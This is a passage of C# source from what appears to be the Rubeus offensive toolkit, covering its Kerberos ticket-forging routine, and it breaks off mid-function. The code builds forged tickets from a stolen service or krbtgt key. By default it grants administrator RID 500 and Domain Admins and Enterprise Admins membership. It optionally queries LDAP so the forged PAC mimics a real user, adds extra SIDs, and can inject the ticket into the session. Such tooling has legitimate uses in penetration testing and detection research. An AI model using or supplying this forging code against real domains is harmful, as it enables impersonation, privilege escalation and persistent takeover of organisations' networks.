b'\xef\xbb\xbfusing System;\nusing System.Text;\nusing System.Security.Principal;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Globalization;\nusing System.DirectoryServices;\nusing System.Text.RegularExpressions;\nusing Rubeus.lib.Interop;\nusing Rubeus.Kerberos.PAC;\nusing Rubeus.Kerberos;\n\nnamespace Rubeus\n{\n    public class ForgeTickets\n    {\n        public static void ForgeTicket(\n            // always required arguments\n            string user,\n            string sname,\n            byte[] serviceKey,\n            Interop.KERB_ETYPE etype,\n            // krbtgt key information\n            byte[] krbKey = null,\n            Interop.KERB_CHECKSUM_ALGORITHM krbeType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256,\n            // ldap information\n            bool ldap = false,\n            string ldapuser = null,\n            string ldappassword = null,\n            // domain and DC information\n            string sid = "",\n            string domain = "",\n            string netbiosName = "",\n            string domainController = "",\n            // ticket flags\n            Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent,\n            // ticket time information\n            DateTime? startTime = null,\n            DateTime? rangeEnd = null,\n            string rangeInterval = "1d",\n            DateTime? authTime = null,\n            string endTime = "",\n            string renewTill = "",\n            // other PAC fields\n            int? id = null,\n            string groups = "",\n            string sids = "",\n            string displayName = "",\n            short? logonCount = null,\n            short? badPwdCount = null,\n            DateTime? lastLogon = null,\n            DateTime? logoffTime = null,\n            DateTime? pwdLastSet = null,\n            int? maxPassAge = null,\n            int? minPassAge = null,\n            int? pGid = null,\n            string homeDir = "",\n            string homeDrive = "",\n            string profilePath = "",\n            string scriptPath = "",\n            string resourceGroupSid = "",\n            List<int> resourceGroups = null,\n            Interop.PacUserAccountControl uac = Interop.PacUserAccountControl.NORMAL_ACCOUNT,\n            bool newPac = false,\n            // arguments to deal with resulting ticket(s)\n            string outfile = null,\n            bool ptt = false,\n            // print a command to rebuild the ticket(s)\n            bool printcmd = false,\n            // arguments for unusual tickets\n            string cName = null,\n            string cRealm = null,\n            string s4uProxyTarget = null,\n            string s4uTransitedServices = null,\n            bool includeAuthData = false\n            )\n        {\n            // vars\n            int c = 0;\n            DateTime originalStartTime = (DateTime)startTime;\n            System.Net.NetworkCredential ldapCred = null;\n            int? origMinPassAge = minPassAge;\n            int? origMaxPassAge = maxPassAge;\n\n            // initialise LogonInfo section and set defaults\n            var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();\n            kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(user);\n            kvi.FullName = new Ndr._RPC_UNICODE_STRING("");\n            kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING("");\n            kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING("");\n            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING("");\n            kvi.LogonScript = new Ndr._RPC_UNICODE_STRING("");\n            kvi.LogonServer = new Ndr._RPC_UNICODE_STRING("");\n            kvi.UserSessionKey = Ndr._USER_SESSION_KEY.CreateDefault();\n            kvi.LogonTime = new Ndr._FILETIME(((DateTime)startTime).AddSeconds(-1));\n            kvi.LogoffTime = Ndr._FILETIME.CreateDefault();\n            kvi.PasswordLastSet = Ndr._FILETIME.CreateDefault();\n            kvi.KickOffTime = Ndr._FILETIME.CreateDefault();\n            kvi.PasswordCanChange = Ndr._FILETIME.CreateDefault();\n            kvi.PasswordMustChange = Ndr._FILETIME.CreateDefault();\n            kvi.LogonCount = 0;\n            kvi.BadPasswordCount = 0;\n            kvi.UserId = 500;\n            kvi.PrimaryGroupId = 513;\n            if (string.IsNullOrEmpty(groups))\n            {\n                kvi.GroupCount = 5;\n                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[] {\n                    new Ndr._GROUP_MEMBERSHIP(520, 0),\n                    new Ndr._GROUP_MEMBERSHIP(512, 0),\n                    new Ndr._GROUP_MEMBERSHIP(513, 0),\n                    new Ndr._GROUP_MEMBERSHIP(519, 0),\n                    new Ndr._GROUP_MEMBERSHIP(518, 0),\n                };\n            }\n            kvi.UserAccountControl = (int)uac;\n            kvi.UserFlags = 0;\n            if (String.IsNullOrEmpty(sids))\n            {\n                kvi.SidCount = 0;\n                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {\n                        new Ndr._KERB_SID_AND_ATTRIBUTES()};\n            }\n\n            // get network credential from ldapuser and ldappassword\n            if (!String.IsNullOrEmpty(ldapuser))\n            {\n                // provide an alternate user to use for connection creds\n                if (!Regex.IsMatch(ldapuser, ".+\\\\.+", RegexOptions.IgnoreCase))\n                {\n                    Console.WriteLine("\\r\\n[X] /creduser specification must be in fqdn format (domain.com\\\\user)\\r\\n");\n                    return;\n                }\n\n                try\n                {\n                    string[] ldapParts = ldapuser.Split(\'\\\\\');\n                    string ldapDomainName = ldapParts[0];\n                    string ldapUserName = ldapParts[1];\n\n                    ldapCred = new System.Net.NetworkCredential(ldapUserName, ldappassword, ldapDomainName);\n                }\n                catch\n                {\n                    Console.WriteLine("\\r\\n[X] /creduser specification must be in fqdn format (domain.com\\\\user)\\r\\n");\n                    return;\n                }\n            }\n\n\n            // determine domain if not supplied\n            string[] parts = sname.Split(\'/\');\n            if (String.IsNullOrEmpty(domain))\n            {\n                if ((parts.Length > 1) && (parts[0] == "krbtgt"))\n                {\n                    Console.WriteLine("[X] TGT or referral TGT requires /domain to be passed.");\n                    return;\n                }\n                else if ((parts.Length == 1) && (sname.Split(\'@\').Length == 1))\n                {\n                    Console.WriteLine("[X] SPN has to be in the format \'svc/host.domain.com\' or \'host@domain.com\'.");\n                    return;\n                }\n                else if (parts.Length > 1)\n                {\n                    domain = parts[1].Substring(parts[1].IndexOf(\'.\') + 1);\n                    string[] domainParts = domain.Split(\':\');\n                    if (domainParts.Length > 1)\n                    {\n                        domain = domainParts[0];\n                    }\n                }\n                else if (sname.Split(\'@\').Length > 1)\n                {\n                    domain = sname.Split(\'@\')[1];\n                }\n                else\n                {\n                    Console.WriteLine("[X] SPN is in a unsupported format: {0}.", sname);\n                    return;\n                }\n            }\n            if (String.IsNullOrEmpty(netbiosName))\n            {\n                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(domain.Substring(0, domain.IndexOf(\'.\')).ToUpper());\n            }\n\n            // if /ldap was passed make the LDAP queries\n            if (ldap)\n            {\n                // try LDAPS and fail back to LDAP\n                List<IDictionary<string, Object>> ActiveDirectoryObjects = null;\n                bool ssl = true;\n                if (String.IsNullOrEmpty(domainController))\n                {\n                    domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user\'s domain\n                }\n\n                Console.WriteLine("[*] Trying to query LDAP using LDAPS for user information on domain controller {0}", domainController);\n                ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);\n                if (ActiveDirectoryObjects == null)\n                {\n                    Console.WriteLine("[!] LDAPS failed, retrying with plaintext LDAP.");\n                    ssl = false;\n                    ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);\n                }\n                if (ActiveDirectoryObjects == null)\n                {\n                    Console.WriteLine("[X] Error LDAP query failed, unable to create ticket using LDAP.");\n                    return;\n                }\n\n                foreach (var userObject in ActiveDirectoryObjects)\n                {\n                    string objectSid = (string)userObject["objectsid"];\n                    string domainSid = objectSid.Substring(0, objectSid.LastIndexOf(\'-\'));\n\n                    // parse the UAC field and set in the PAC\n                    if (uac == Interop.PacUserAccountControl.NORMAL_ACCOUNT)\n                    {\n                        kvi.UserAccountControl = 0;\n                        Interop.LDAPUserAccountControl userUAC = (Interop.LDAPUserAccountControl)userObject["useraccountcontrol"];\n                        if ((userUAC & Interop.LDAPUserAccountControl.ACCOUNTDISABLE) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ACCOUNTDISABLE;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.HOMEDIR_REQUIRED) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.HOMEDIR_REQUIRED;\n                        }\n\n                        if ((userUAC & Interop.LDAPUserAccountControl.PASSWD_NOTREQD) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PASSWD_NOTREQD;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.TEMP_DUPLICATE_ACCOUNT) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TEMP_DUPLICATE_ACCOUNT;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.NORMAL_ACCOUNT) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NORMAL_ACCOUNT;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.MNS_LOGON_ACCOUNT) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.MNS_LOGON_ACCOUNT;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.WORKSTATION_TRUST_ACCOUNT) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.WORKSTATION_TRUST_ACCOUNT;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.SERVER_TRUST_ACCOUNT) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.SERVER_TRUST_ACCOUNT;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.DONT_EXPIRE_PASSWORD) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD;\n                        }\n                        // Is this right? LDAP UAC field doesn\'t contain ACCOUNT_AUTO_LOCKED, LOCKOUT looks like the most likely candidate\n                        if ((userUAC & Interop.LDAPUserAccountControl.LOCKOUT) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ACCOUNT_AUTO_LOCKED;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.ENCRYPTED_TEXT_PWD_ALLOWED) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ENCRYPTED_TEXT_PASSWORD_ALLOWED;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.SMARTCARD_REQUIRED) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.SMARTCARD_REQUIRED;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.TRUSTED_FOR_DELEGATION) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_FOR_DELEGATION;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.NOT_DELEGATED) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NOT_DELEGATED;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.USE_DES_KEY_ONLY) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.USE_DES_KEY_ONLY;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.DONT_REQ_PREAUTH) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.DONT_REQ_PREAUTH;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.PASSWORD_EXPIRED) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PASSWORD_EXPIRED;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.NO_AUTH_DATA_REQUIRED) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NO_AUTH_DATA_REQUIRED;\n                        }\n                        if ((userUAC & Interop.LDAPUserAccountControl.PARTIAL_SECRETS_ACCOUNT) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PARTIAL_SECRETS_ACCOUNT;\n                        }\n                        /* No USE_AES_KEYS bit seems to exist in the UAC field returned by LDAP\n                        if ((userUAC & Interop.LDAPUserAccountControl.USE_AES_KEYS) != 0)\n                        {\n                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.USE_AES_KEYS;\n                        }*/\n                    }\n\n                    List<IDictionary<string, Object>> adObjects = null;\n\n                    // build group and domain policy filter\n                    string filter = "";\n                    string outputText = "";\n                    if (string.IsNullOrEmpty(groups))\n                    {\n                        if (userObject.ContainsKey("memberof"))\n                        {\n                            foreach (string groupDN in (string[])userObject["memberof"])\n                            {\n                                filter += String.Format("(distinguishedname={0})", groupDN);\n                            }\n                            outputText += "group";\n                        }\n                    }\n\n                    if (pGid == null)\n                        filter += String.Format("(objectsid={0}-{1})", domainSid, (string)userObject["primarygroupid"]);\n\n                    if (minPassAge == null || (maxPassAge == null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0)))\n                    {\n                        filter = String.Format("{0}(name={{31B2F340-016D-11D2-945F-00C04FB984F9}})", filter);\n                        if (String.IsNullOrEmpty(outputText))\n                        {\n                            outputText = "domain policy";\n                        }\n                        else\n                        {\n                            outputText = String.Format("{0} and domain policy", outputText);\n                        }\n                    }\n\n                    if (!String.IsNullOrEmpty(filter))\n                    {\n                        // Try to get group and domain policy information from LDAP\n                        Console.WriteLine("[*] Retrieving {0} information over LDAP from domain controller {1}", outputText, domainController);\n                        adObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(|{0})", filter), ssl);\n                        if (adObjects == null)\n                        {\n                            Console.WriteLine("[!] Unable to get {0} information using LDAP, using defaults.", outputText);\n                        }\n                        else\n                        {\n                            if (userObject.ContainsKey("memberof"))\n                            {\n                                kvi.GroupCount = ((string[])userObject["memberof"]).Length + 1;\n                                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[((string[])userObject["memberof"]).Length + 1];\n                            }\n                            else\n                            {\n                                kvi.GroupCount = 1;\n                                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[1];\n                            }\n                            c = 0;\n                            foreach (var o in adObjects)\n                            {\n                                if (o.ContainsKey("gpcfilesyspath"))\n                                {\n                                    string gptTmplPath = String.Format("{0}\\\\MACHINE\\\\Microsoft\\\\Windows NT\\\\SecEdit\\\\GptTmpl.inf", (string)o["gpcfilesyspath"]);\n                                    gptTmplPath = gptTmplPath.Replace(String.Format("\\\\\\\\{0}\\\\", domain), String.Format("\\\\\\\\{0}\\\\", domainController));\n                                    Dictionary<string, Dictionary<string, Object>> gptTmplObject = Networking.GetGptTmplContent(gptTmplPath, ldapuser, ldappassword);\n\n                                    if (gptTmplObject == null)\n                                    {\n                                        Console.WriteLine("[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.");\n                                        continue;\n                                    }\n\n                                    if (minPassAge == null)\n                                    {\n                                        minPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MinimumPasswordAge"]);\n                                        if (minPassAge > 0)\n                                        {\n                                            kvi.PasswordCanChange = new Ndr._FILETIME(((DateTime)userObject["pwdlastset"]).AddDays((double)minPassAge));\n                                        }\n                                    }\n                                    if (maxPassAge == null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0))\n                                    {\n                                        maxPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MaximumPasswordAge"]);\n                                        if (maxPassAge > 0)\n                                        {\n                                            kvi.PasswordMustChange = new Ndr._FILETIME(((DateTime)userObject["pwdlastset"]).AddDays((double)maxPassAge));\n                                        }\n                                    }\n                                }\n                                else\n                                {\n                                    string groupSid = (string)o["objectsid"];\n                                    int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf(\'-\') + 1));\n                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, 7) }, 0, kvi.GroupIds, c, 1);\n                                    c += 1;\n                                }\n                            }\n                        }\n                    }\n\n                    // preform the netbios name lookup\n                    if (String.IsNullOrEmpty(netbiosName))\n                    {\n                        Console.WriteLine("[*] Retrieving netbios name information over LDAP from domain controller {0}", domainController);\n\n                        // first get forest root\n                        string forestRoot = null;\n                        try\n                        {\n                            forestRoot = System.DirectoryServices.ActiveDirectory.Forest.GetCurrentForest().RootDomain.Name;\n                        }\n                        catch\n                        {\n                            Console.WriteLine("[!] Unable to query forest root using System.DirectoryServices.ActiveDirectory.Forest, assuming {0} is the forest root", domain);\n                            forestRoot = domain;\n                        }\n\n                        string configRootDomain = domain;\n                        if (!domain.Equals(forestRoot))\n                            configRootDomain = forestRoot;\n\n                        string configOU = String.Format("CN=Configuration,DC={0}", configRootDomain.Replace(".", ",DC="));\n\n                        adObjects = Networking.GetLdapQuery(ldapCred, configOU, domainController, domain, String.Format("(&(netbiosname=*)(dnsroot={0}))", domain), ssl);\n                        if (adObjects == null)\n                        {\n                            Console.WriteLine("[!] Unable to get netbios name information using LDAP, using defaults.");\n                        }\n                        else\n                        {\n                            foreach (var o in adObjects)\n                            {\n                                if (o.ContainsKey("netbiosname"))\n                                {\n                                    kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING((string)o["netbiosname"]);\n                                }\n                            }\n                        }\n                    }\n\n                    // set the rest of the PAC fields\n                    if (userObject.ContainsKey("displayname"))\n                    {\n                        kvi.FullName = new Ndr._RPC_UNICODE_STRING((string)userObject["displayname"]);\n                    }\n\n                    if (String.IsNullOrEmpty(sid))\n                    {\n                        kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));\n                    }\n                    kvi.LogonCount = short.Parse((string)userObject["logoncount"]);\n                    kvi.BadPasswordCount = short.Parse((string)userObject["badpwdcount"]);\n                    if ((DateTime)userObject["lastlogon"] != DateTime.MinValue)\n                    {\n                        kvi.LogonTime = new Ndr._FILETIME((DateTime)userObject["lastlogon"]);\n                    }\n                    if ((DateTime)userObject["lastlogoff"] != DateTime.MinValue)\n                    {\n                        kvi.LogoffTime = new Ndr._FILETIME((DateTime)userObject["lastlogoff"]);\n                    }\n                    if ((DateTime)userObject["pwdlastset"] != DateTime.MinValue)\n                    {\n                        kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)userObject["pwdlastset"]);\n                    }\n                    kvi.PrimaryGroupId = Int32.Parse((string)userObject["primarygroupid"]);\n                    kvi.UserId = Int32.Parse(objectSid.Substring(objectSid.LastIndexOf(\'-\') + 1));\n                    if (userObject.ContainsKey("homedirectory"))\n                    {\n                        kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING((string)userObject["homedirectory"]);\n                    }\n                    if (userObject.ContainsKey("homedrive"))\n                    {\n                        kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING((string)userObject["homedrive"]);\n                    }\n                    if (userObject.ContainsKey("profilepath"))\n                    {\n                        kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING((string)userObject["profilepath"]);\n                    }\n                    if (userObject.ContainsKey("scriptpath"))\n                    {\n                        kvi.LogonScript = new Ndr._RPC_UNICODE_STRING((string)userObject["scriptpath"]);\n                    }\n\n                }\n\n            }\n            else if (String.IsNullOrEmpty(sid))\n            {\n                Console.WriteLine("[X] To forge tickets without specifying \'/ldap\', \'/sid\' is required.");\n                return;\n            }\n\n            // initialize some structures\n            KRB_CRED cred = new KRB_CRED();\n            KrbCredInfo info = new KrbCredInfo();\n\n            Console.WriteLine("[*] Building PAC");\n\n            // overwrite any LogonInfo fields here sections\n            if (!String.IsNullOrEmpty(netbiosName))\n            {\n                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(netbiosName);\n            }\n            if (!String.IsNullOrEmpty(sid))\n            {\n                kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(sid));\n            }\n            if (!String.IsNullOrEmpty(groups))\n            {\n                List<int> allGroups = new List<int>();\n                foreach (string gid in groups.Split(\',\'))\n                {\n                    try\n                    {\n                        allGroups.Add(Int32.Parse(gid));\n                    }\n                    catch (Exception e)\n                    {\n                        Console.WriteLine("[X] Error unable to parse group id {0}: {1}", gid, e.Message);\n                    }\n                }\n                if ((pGid != null) && !allGroups.Contains((int)pGid))\n                    allGroups.Add((int)pGid);\n                int numOfGroups = allGroups.Count;\n                kvi.GroupCount = numOfGroups;\n                kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[numOfGroups];\n                c = 0;\n                foreach (int gid in allGroups)\n                {\n                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(gid, 7) }, 0, kvi.GroupIds, c, 1);\n                    c += 1;\n                }\n            }\n            if (!String.IsNullOrEmpty(sids))\n            {\n                int numOfSids = sids.Split(\',\').Length;\n                kvi.SidCount = numOfSids;\n                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[numOfSids];\n                c = 0;\n                foreach (string s in sids.Split(\',\'))\n                {\n                    Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), 7) }, 0, kvi.ExtraSids, c, 1);\n                    c += 1;\n                }\n            }\n            if (!String.IsNullOrEmpty(resourceGroupSid) && (resourceGroups != null))\n            {\n                try\n                {\n                    kvi.ResourceGroupDomainSid = new Ndr._RPC_SID(new SecurityIdentifier(resourceGroupSid));\n                    kvi.ResourceGroupCount = resourceGroups.Count;\n                    kvi.ResourceGroupIds = new Ndr._GROUP_MEMBERSHIP[resourceGroups.Count];\n                    c = 0;\n                    foreach (int rgroup in resourceGroups)\n                    {\n                        Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(rgroup, 7) }, 0, kvi.ResourceGroupIds, c, 1);\n                        c += 1;\n                    }\n                }\n                catch\n                {\n\n                }\n            }\n            if (kvi.SidCount > 0)\n            {\n                kvi.UserFlags = kvi.UserFlags | (int)Interop.PacUserFlags.EXTRA_SIDS;\n            }\n            if (kvi.ResourceGroupCount > 0)\n            {\n                kvi.UserFlags = kvi.UserFlags | (int)Interop.PacUserFlags.RESOURCE_GROUPS;\n            }\n            if (!String.IsNullOrEmpty(domainController))\n            {\n                string dcName = Networking.GetDCNameFromIP(domainController);\n                if (dcName != null)\n                {\n                    kvi.LogonServer = new Ndr._RPC_UNICODE_STRING(domainController.Substring(0, domainController.IndexOf(\'.\')).ToUpper());\n                }\n            }\n            if (!String.IsNullOrEmpty(displayName))\n            {\n                kvi.FullName = new Ndr._RPC_UNICODE_STRING(displayName);\n            }\n            if (logonCount != null)\n            {\n                kvi.LogonCount = (short)logonCount;\n            }\n            if (badPwdCount != null)\n            {\n                kvi.BadPasswordCount = (short)badPwdCount;\n            }\n            if (lastLogon != null)\n            {\n                kvi.LogonTime = new Ndr._FILETIME((DateTime)lastLogon);\n            }\n            if (logoffTime != null)\n            {\n                kvi.LogoffTime = new Ndr._FILETIME((DateTime)logoffTime);\n            }\n            if (pwdLastSet != null)\n            {\n                kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)pwdLastSet);\n            }\n            if (origMinPassAge != null)\n            {\n                try\n                {\n                    DateTime passLastSet = DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32));\n                    if (minPassAge > 0)\n                    {\n                        kvi.PasswordCanChange = new Ndr._FILETIME(passLastSet.AddDays((double)minPassAge));\n                    }\n                }\n                catch\n                {\n                    Console.WriteLine("[!] Something went wrong setting the PasswordCanChange field, perhaps PasswordLastSet is not configured properly");\n                }\n            }\n            if (origMaxPassAge != null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0))\n            {\n                try\n                {\n                    DateTime passLastSet = DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32));\n                    if (maxPassAge > 0)\n                    {\n                        kvi.PasswordMustChange = new Ndr._FILETIME(passLastSet.AddDays((double)maxPassAge));\n                    }\n                }\n                catch\n                {\n                    Console.WriteLine("[!] Something went wrong setting the PasswordMustChange field, perhaps PasswordLastSet is not configured properly");\n                }\n            }\n            if (id != null)\n            {\n                kvi.UserId = (int)id;\n            }\n            if (pGid != null)\n            {\n                kvi.PrimaryGroupId = (int)pGid;\n            }\n            if (!String.IsNullOrEmpty(homeDir))\n            {\n                kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING(homeDir);\n            }\n            if (!String.IsNullOrEmpty(homeDrive))\n            {\n                kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING(homeDrive);\n            }\n            if (!String.IsNullOrEmpty(profilePath))\n            {\n                kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(profilePath);\n            }\n            if (!String.IsNullOrEmpty(scriptPath))\n            {\n                kvi.LogonScript = new Ndr._RPC_UNICODE_STRING(scriptPath);\n            }\n\n\n            // generate a random session key, encryption type and checksum types\n            Random random = new Random();\n            byte[] randKeyBytes;\n            SignatureData svrSigData = new SignatureData(PacInfoBufferType.ServerChecksum);\n            SignatureData kdcSigData = new SignatureData(PacInfoBufferType.KDCChecksum);\n            int svrSigLength = 12, kdcSigLength = 12;\n            if (etype == Interop.KERB_ETYPE.rc4_hmac)\n            {\n                randKeyBytes = new byte[16];\n                random.NextBytes(randKeyBytes);\n                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;\n                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;\n                svrSigLength = 16;\n                kdcSigLength = 16;\n            }\n            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)\n            {\n                randKeyBytes = new byte[32];\n                random.NextBytes(randKeyBytes);\n                svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;\n                kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;\n            }\n            else\n            {\n                Console.WriteLine("[X] Only rc4_hmac and aes256_cts_hmac_sha1 key hashes supported at this time!");\n                return;\n            }\n\n            // if the krbtgt key is specified, use the checksum type also specified\n            if (krbKey != null)\n            {\n                kdcSigData.SignatureType = krbeType;\n                if ((krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256) || (krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))\n                {\n                    kdcSigLength = 12;\n                }\n                else\n                {\n                    kdcSigLength = 16;\n                }\n            }\n\n            // set krbKey to serviceKey if none is given\n            if (krbKey == null)\n            {\n                krbKey = serviceKey;\n            }\n\n            // output some ticket information relevent to all tickets generated\n            Console.WriteLine("");\n            Console.WriteLine("[*] Domain         : {0} ({1})", domain.ToUpper(), kvi.LogonDomainName);\n            Console.WriteLine("[*] SID            : {0}", kvi.LogonDomainId?.GetValue());\n            Console.WriteLine("[*] UserId         : {0}", kvi.UserId);\n            if (kvi.GroupCount > 0)\n            {\n                Console.WriteLine("[*] Groups         : {0}", kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));\n            }\n            if (kvi.SidCount > 0)\n            {\n                Console.WriteLine("[*] ExtraSIDs      : {0}", kvi.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));\n            }\n            Console.WriteLine("[*] ServiceKey     : {0}", Helpers.ByteArrayToString(serviceKey));\n            Console.WriteLine("[*] ServiceKeyType : {0}", svrSigData.SignatureType);\n            Console.WriteLine("[*] KDCKey         : {0}", Helpers.ByteArrayToString(krbKey));\n            Console.WriteLine("[*] KDCKeyType     : {0}", kdcSigData.SignatureType);\n            Console.WriteLine("[*] Service        : {0}", parts[0]);\n            Console.WriteLine("[*] Target         : {0}", parts[1]);\n            Console.WriteLine("");\n\n            // loop incase we need to generate multiple tickets as everything below this are effected\n            do\n            {\n                // Create PacInfoBuffers\n                kvi.LogonTime = new Ndr._FILETIME((DateTime)startTime);\n                LogonInfo li = new LogonInfo(kvi);\n\n                if (String.IsNullOrEmpty(cName))\n                    cName = user;\n                if (String.IsNullOrEmpty(cRealm))\n                    cRealm = domain;\n\n                ClientName cn = null;\n                if (parts[0].Equals("krbtgt") && !cRealm.Equals(domain))\n                    cn = new ClientName((DateTime)startTime, String.Format("{0}@{1}@{1}", user, domain.ToUpper()));\n                else\n                    cn = new ClientName((DateTime)startTime, user);\n\n                